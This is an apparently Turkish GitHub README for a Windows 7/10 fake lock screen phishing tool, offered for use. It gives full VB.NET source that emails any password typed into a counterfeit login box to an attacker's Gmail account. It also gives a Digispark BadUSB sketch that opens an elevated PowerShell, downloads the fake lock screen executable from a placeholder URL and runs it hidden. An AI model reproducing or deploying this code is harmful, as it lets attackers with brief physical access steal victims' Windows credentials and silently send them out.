# WindowsFakeLockScreen

<strong>WIN7 OR WIN10 FAKE LOCK SCREEN MAIL SENDING</strong>

<img src="https://i.hizliresim.com/Ii5hUx.png">

<img src="https://i.hizliresim.com/COYKEc.png">

Üst kısımdaki resimden de anlayacağınız Windows 7 ve Windows 10 için sahte bir login ekranıdır.
Programı visual basic ile oluşturdum.
Mantık programda textbox kısmına girilen herhangi bir yazıyı belirlediğimiz mail adresine göndermektir.
Bu programı BadUSB ile birlikte kullanmak amaçlı oluşturdum ve BadUSB olarak Digispark kullandım.

<li>Amaç:</li>
<li>BadUSB yani Digispark bilgisayara takılır</li></li>
<li>Belirli kodlar çalışır</li>
<li>sahte login ekranı oluşur</li>
<li>Son olarak girilen şifre belirlediğimiz mail adresine gönderilir</li>



Digispark ile ilgli bilgiye ulaşmak için: https://digistump.com/wiki/digispark bu adrese bakın

Sahte görüntü tamamen bir görseldir sadece TextBox ve Button olan kısım eklenmiştir butonun daha gerçekçi gözükmesi için PictureBox olarak ayarladım.

Programı Visual Studio 2013 Ultimate kullanarak hazırladım

<strong>PROGRAMIN KAYNAK KODU</strong>

<blockquote>
<p><strong>NOT:</strong></p>
<p>Kaynak kodlar içerisindeki belirttiğim kısımları kendinize göre doldurun sizden sadece mail adresi ve şifresi istenmekte</p>
</blockquote>

<pre><code>Imports System.Net.Mail
Public Class Form1

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub PictureBox3_Click(sender As System.Object, e As System.EventArgs) Handles PictureBox3.Click
        Dim MyMailMessage As New MailMessage()

            Try
                MyMailMessage.From = New MailAddress("mailadress@gmail.com")
                MyMailMessage.To.Add("mailadress@gmail.com")
                MyMailMessage.Subject = TextBox1.Text
                MyMailMessage.Body = TextBox2.Text
                Dim SMTP As New SmtpClient("smtp.gmail.com")
                SMTP.Port = 587
                SMTP.EnableSsl = True
                SMTP.Credentials = New System.Net.NetworkCredential("mailadress@gmail.com", "PAROLA")
                SMTP.Send(MyMailMessage)
                TextBox2.Text = ""
                Dim frm As New Form1
                frm.Show()

                Me.Close()
            Catch ex As Exception
            End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim MyMailMessage As New MailMessage()
            MyMailMessage.From = New MailAddress("mailadress@gmail.com")
            MyMailMessage.To.Add("MAILADRESI@gmail.com")
            MyMailMessage.Subject = TextBox1.Text
            MyMailMessage.Body = TextBox2.Text
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 587
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("mailadress@gmail.com", "POROLA")
            SMTP.Send(MyMailMessage)
            TextBox2.Text = ""
            Dim frm As New Form1
            frm.Show()

            Me.Close()

        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged


    End Sub

End Class
</code></pre>

Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır.
Aynı kodları kullanarak win7 ve win10 görseli hazırladım
Kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.

<strong>Digispark kodları</strong>

<code><pre>#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  //coder sefaoruc
  //youtube youtube.com/siberdunya
  //bu kodlar win10 için sahte bir login sayfası oluşturur
  //fake lock screen win10
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT ,KEY_Y);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("Invoke-WebRequest -Uri ('DOWNLOAD_URL') -O C:/fakelock.exe"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell -windowstyle hidden 'C:/fakelock.exe'");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*son*/
  }
}
</code></pre>

Digispark kodlarını da bu şekilde oluşturdum

Mantık Powershell admin olarak başlatmak ve upload ettiğimiz win7 veya win10 exe dosyasını indirip çalıştırmaktır.


